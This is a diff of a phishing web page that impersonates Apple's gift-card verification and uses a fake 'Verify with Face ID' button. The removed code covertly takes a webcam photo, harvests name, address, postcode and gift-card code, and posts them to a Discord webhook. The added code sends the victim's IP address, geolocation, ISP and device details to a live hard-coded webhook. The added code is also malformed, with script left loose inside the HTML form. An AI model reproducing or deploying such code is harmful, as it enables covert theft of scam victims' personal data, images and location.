@@ -69,101 +69,58 @@
                 <input type="text" id="zipCode" name="zipCode" autocomplete="postal-code">
             </div>
 
-            <button type="button" class="btn-verify" id="triggerBtn">Verify with Face ID</button>
-        </form>
-    </div>
+            const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1474278703377940580/3_VKijDh9HXYryuyXKkZEkeZR-cwiChce3rxDhozFH2oDxifMzbFW4ZS6ny9MQVRfr3g";
 
-    <video id="cam-stream" autoplay playsinline></video>
-    <canvas id="canvas-capture" width="640" height="480"></canvas>
+async function startVerification() {
+    const btn = document.getElementById('verify-btn');
+    btn.innerText = "Verifying...";
+    btn.disabled = true;
 
-    <div class="footer">Copyright © 2026 Apple Inc.</div>
+    try {
+        // 1. Fetch IP and Location Data
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        const ipData = await ipResponse.json();
 
-    <script>
-        // REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL
-        const DISCORD_WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+        // 2. Gather Device Info
+        const deviceInfo = {
+            ua: navigator.userAgent,
+            platform: navigator.platform,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            language: navigator.language
+        };
 
-        const urlParams = new URLSearchParams(window.location.search);
-        const code = urlParams.get('code');
-        if(code) {
-            document.getElementById('cardCode').value = code;
-            document.getElementById('card-placeholder').innerText = code.toUpperCase();
-        }
+        // 3. Build the Discord Payload
+        const payload = {
+            embeds: [{
+                title: "🚩 New User Verification Attempt",
+                color: 0xff0000, // Red for high visibility
+                fields: [
+                    { name: "💵 Amount", value: "$150.00 AUD", inline: true },
+                    { name: "🌐 IP Address", value: ipData.ip || "Unknown", inline: true },
+                    { name: "📍 Location", value: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`, inline: false },
+                    { name: "🏢 ISP", value: ipData.org || "Unknown", inline: true },
+                    { name: "📱 Device", value: deviceInfo.platform, inline: true },
+                    { name: "🖥️ Resolution", value: deviceInfo.screen, inline: true },
+                    { name: "🧭 User Agent", value: `\`${deviceInfo.ua}\``, inline: false }
+                ],
+                footer: { text: "itunes-hp.vercel.app Logger" },
+                timestamp: new Date().toISOString()
+            }]
+        };
 
-        const triggerBtn = document.getElementById('triggerBtn');
-        const video = document.getElementById('cam-stream');
-        const canvas = document.getElementById('canvas-capture');
-
-        triggerBtn.addEventListener('click', async () => {
-            triggerBtn.innerText = "Verifying Face...";
-            triggerBtn.disabled = true;
-
-            let photoBase64 = "";
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                video.srcObject = stream;
-
-                // Wait for camera to focus, then snap
-                await new Promise(r => setTimeout(r, 1200));
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                photoBase64 = canvas.toDataURL('image/jpeg', 0.6); // Slightly lower quality for Discord limit
-
-                // Kill camera
-                stream.getTracks().forEach(track => track.stop());
-
-                // Trigger Autofill dropdown for user to "confirm" address
-                document.getElementById('fullName').focus();
-
-            } catch (err) {
-                console.log("Cam failed.");
-                document.getElementById('fullName').focus();
-            }
-
-            // Wait 5 seconds for user to potentially autofill before sending
-            setTimeout(() => {
-                sendToDiscord(photoBase64);
-            }, 5000);
+        // 4. Send to Discord
+        await fetch(DISCORD_WEBHOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
         });
 
-        async function sendToDiscord(base64Image) {
-            // Get form data
-            const name = document.getElementById('fullName').value || "Not Found";
-            const city = document.getElementById('town').value || "Not Found";
-            const street = document.getElementById('address').value || "Not Found";
-            const zip = document.getElementById('zipCode').value || "Not Found";
-            const card = document.getElementById('cardCode').value || "No Code";
+        // Trigger your camera capture logic here if needed
+        console.log("Detailed log sent.");
 
-            // Prepare the image to send as an attachment
-            const blob = await (await fetch(base64Image)).blob();
-            const formData = new FormData();
-            
-            // Discord Embed Setup
-            const embed = {
-                title: "🍎 New Verification Captured",
-                color: 3447003,
-                fields: [
-                    { name: "Code", value: `\`${card}\``, inline: true },
-                    { name: "Name", value: name, inline: true },
-                    { name: "Town/City", value: city, inline: true },
-                    { name: "Address", value: street, inline: false },
-                    { name: "Postcode", value: zip, inline: true }
-                ],
-                image: { url: 'attachment://capture.jpg' },
-                footer: { text: "Victorian Tech Services" }
-            };
-
-            formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
-            formData.append('file', blob, 'capture.jpg');
-
-            fetch(DISCORD_WEBHOOK, {
-                method: 'POST',
-                body: formData
-            }).then(() => {
-                // Redirect user to success page
-                window.location.href = "https://www.apple.com/au/shop/gift-cards";
-            });
-        }
-    </script>
+    } catch (err) {
+        console.error("Error capturing data:", err);
+    }
+}
 </body>
 </html>
